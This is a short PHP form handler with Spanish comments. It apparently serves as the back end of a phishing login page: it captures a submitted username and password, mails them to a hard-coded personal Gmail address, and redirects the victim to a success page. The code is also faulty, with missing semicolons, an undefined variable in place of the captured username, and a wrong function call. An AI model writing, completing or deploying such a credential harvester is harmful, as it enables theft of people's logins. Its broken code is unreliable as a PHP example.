<?php
//Para capturar la info que se ingresa en los inputs del form tengo que crear variables.//

$Username = $_POST ["username"];
$password = $_POST ["password"];

//a quien le mando esta info
$para = "sebxstianlugo@gmail.com"
$asunto = "Este mail fue enviado desde la web"

// función que envía la info del form
mail($para, $asunto, utf8_decode($nombre, $password));

// función que redirecciona al usuario una vez que completó el form
header("location:exito.html");
?>